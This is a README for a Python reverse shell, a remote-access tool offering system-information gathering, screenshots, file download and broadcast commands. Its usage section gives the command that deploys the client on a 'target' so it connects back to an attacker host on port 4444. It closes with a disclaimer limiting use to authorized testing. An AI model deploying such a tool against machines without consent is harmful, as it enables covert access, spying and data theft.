# 🔒 Python Reverse Shell 🖥️

## 📋 Overview
This project provides a robust and feature-rich implementation of a reverse shell written in Python. The implementation includes both client and server components, allowing for remote system access and management.

## ✨ Features
- 🔍 **System Information Gathering**: Collect detailed information about the target system
- 📸 **Screenshot Capture**: Remotely capture screenshots from the target
- 📥 **File Download**: Download files from the target system
- 📢 **Broadcast Commands**: Send commands to multiple connected clients
- 🌐 **Cross-Platform**: Works on Windows, Linux, and macOS

## 🛠️ Requirements
The following Python packages are required:
```
psutil
mss
colorama
```

## 📦 Installation
1. Clone the repository:
```bash
git clone https://github.com/yourusername/reverse-shell.git
cd reverse-shell
```

2. Install the required dependencies:
```bash
pip install -r requirements.txt
```

## 💻 Usage

### Setting up the server
Run the server component on your machine (the attacker):
```bash
python server.py --port 4444
```

### Running the client
Deploy and run the client component on the target machine:
```bash
python client.py --server 192.168.1.100 --port 4444
```

### Available Commands
Once connected, you can use various commands:
- `sysinfo`: Gather system information
- `screenshot`: Capture a screenshot
- `download <filename>`: Download a file from the target
- `broadcast <command>`: Send a command to all connected clients
- `help`: Display available commands

###**Note**
Will fix the issues regarding cross platform errors soon. Peace✌️
  
## ⚠️ Security Warning
**IMPORTANT**: This tool is designed for educational purposes, security testing, and system administration only. Unauthorized access to computer systems is illegal and unethical.

- Only use this tool on systems you own or have explicit permission to test
- Do not use for malicious purposes
- The authors are not responsible for any misuse or damage caused by this program

## 📄 License
This project is licensed under the MIT License - see the LICENSE file for details.
